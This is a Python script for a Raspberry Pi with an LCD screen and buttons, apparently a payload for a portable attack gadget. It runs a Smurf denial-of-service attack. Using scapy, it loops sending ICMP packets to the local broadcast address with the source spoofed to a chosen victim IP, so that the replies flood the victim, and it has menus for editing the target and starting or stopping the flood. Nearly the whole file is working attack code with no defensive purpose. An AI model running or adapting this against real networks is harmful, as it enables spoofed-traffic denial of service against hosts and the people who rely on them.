#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
import threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import *
conf.verb = 0

VICTIM_IP = "192.168.1.100"

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
FONT = ImageFont.load_default()

running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0
broadcast_ip = None
current_ip_input = VICTIM_IP
ip_input_cursor_pos = 0

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main", status: str = ""):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Smurf Attack", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Victim IP:", font=FONT, fill="white")
        d.text((5, 45), VICTIM_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), f"Broadcast: {broadcast_ip}", font=FONT, fill="white")
        d.text((5, 115), "OK=Start | KEY1=Edit IP | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Victim IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
        d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
        d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")
        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_ui("ip_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                show_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.1)
    return None

def get_broadcast_ip(interface="eth0"):
    try:
        iface_info = get_if_addr(interface)
        if iface_info:
            net, mask = get_if_addr(interface), get_if_mask(interface)
            ip_int = int(IPv4Address(net))
            mask_int = int(IPv4Address(mask))
            broadcast_int = ip_int | (~mask_int & 0xFFFFFFFF)
            return str(IPv4Address(broadcast_int))
    except Exception as e:
        print(f"Error getting broadcast IP for {interface}: {e}", file=sys.stderr)
    return None

def smurf_worker():
    global packet_count
    if not broadcast_ip:
        print("Error: Broadcast IP not found.", file=sys.stderr)
        return

    p = IP(src=VICTIM_IP, dst=broadcast_ip) / ICMP()
    
    while not attack_stop_event.is_set():
        send(p, iface="eth0", verbose=0)
        packet_count += 1
        time.sleep(0.5)

def start_attack():
    global attack_thread, packet_count
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        attack_stop_event.clear()
        attack_thread = threading.Thread(target=smurf_worker, daemon=True)
        attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

if __name__ == "__main__":
    try:
        broadcast_ip = get_broadcast_ip("eth0")
        if not broadcast_ip:
            show_message(["ERROR:", "No Broadcast IP!", "Check eth0."], "red")
            time.sleep(3)
            raise SystemExit("Could not determine broadcast IP.")

        current_screen = "main"

        while running:
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    start_attack()
                    current_screen = "attacking"
                    time.sleep(0.3)
                
                if GPIO.input(PINS["KEY1"]) == 0:
                    current_ip_input = VICTIM_IP
                    current_screen = "ip_input"
                    time.sleep(0.3)
            
            elif current_screen == "ip_input":
                new_ip = handle_ip_input_logic(current_ip_input)
                if new_ip:
                    VICTIM_IP = new_ip
                current_screen = "main"
                time.sleep(0.3)
            
            elif current_screen == "attacking":
                draw_ui("attacking", "ACTIVE")
                if GPIO.input(PINS["KEY3"]) == 0:
                    stop_attack()
                    current_screen = "main"
                    time.sleep(0.3)
                if GPIO.input(PINS["OK"]) == 0:
                    stop_attack()
                    current_screen = "main"
                    time.sleep(0.3)
                time.sleep(0.1)

            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        show_message(["CRITICAL ERROR:", str(e)[:20]], "red")
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Smurf Attack payload finished.")